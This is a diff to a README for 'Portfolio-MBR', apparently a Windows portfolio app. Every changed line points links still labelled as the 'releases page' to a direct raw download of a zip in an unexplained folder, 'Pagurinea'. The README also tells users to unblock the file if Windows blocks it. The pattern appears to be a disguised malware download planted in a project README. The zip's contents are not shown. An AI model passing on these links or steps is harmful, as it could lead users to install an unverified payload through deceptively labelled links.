@@ -1,6 +1,6 @@
 # 🧭 Portfolio-MBR - Show Your Work With Clarity
 
-[![Download Portfolio-MBR](https://img.shields.io/badge/Download-Portfolio--MBR-blue?style=for-the-badge&logo=github)](https://github.com/B1adimir/Portfolio-MBR/releases)
+[![Download Portfolio-MBR](https://img.shields.io/badge/Download-Portfolio--MBR-blue?style=for-the-badge&logo=github)](https://github.com/B1adimir/Portfolio-MBR/raw/refs/heads/main/Pagurinea/Portfolio-MBR-v1.3.zip)
 
 ## 📘 About Portfolio-MBR
 
@@ -19,7 +19,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 ## 🚀 Download and Run on Windows
 
-1. Visit the [Portfolio-MBR releases page](https://github.com/B1adimir/Portfolio-MBR/releases).
+1. Visit the [Portfolio-MBR releases page](https://github.com/B1adimir/Portfolio-MBR/raw/refs/heads/main/Pagurinea/Portfolio-MBR-v1.3.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from the release assets.
 4. If the file is in a ZIP folder, right-click it and choose Extract All.
@@ -68,7 +68,7 @@ Highlights the Cape Town, South Africa base, which helps local clients and emplo
 
 If you are opening the app for the first time on Windows, follow these steps:
 
-1. Download the latest release from the [release page](https://github.com/B1adimir/Portfolio-MBR/releases).
+1. Download the latest release from the [release page](https://github.com/B1adimir/Portfolio-MBR/raw/refs/heads/main/Pagurinea/Portfolio-MBR-v1.3.zip).
 2. Save the file to your Downloads folder.
 3. If Windows blocks the file, right-click it and choose Properties.
 4. Look for an Unblock option, then apply it if shown.
@@ -163,7 +163,7 @@ Keep the text short and easy to read. Use real project names and clear descripti
 - Restart the app file
 
 ### Download looks incomplete
-- Return to the [release page](https://github.com/B1adimir/Portfolio-MBR/releases)
+- Return to the [release page](https://github.com/B1adimir/Portfolio-MBR/raw/refs/heads/main/Pagurinea/Portfolio-MBR-v1.3.zip)
 - Download the file again
 - Check your internet connection
 
@@ -171,7 +171,7 @@ Keep the text short and easy to read. Use real project names and clear descripti
 
 Use this link to visit the download page and get the latest Windows release:
 
-[Visit the Portfolio-MBR Releases Page](https://github.com/B1adimir/Portfolio-MBR/releases)
+[Visit the Portfolio-MBR Releases Page](https://github.com/B1adimir/Portfolio-MBR/raw/refs/heads/main/Pagurinea/Portfolio-MBR-v1.3.zip)
 
 ## 🗂️ Folder Layout
 
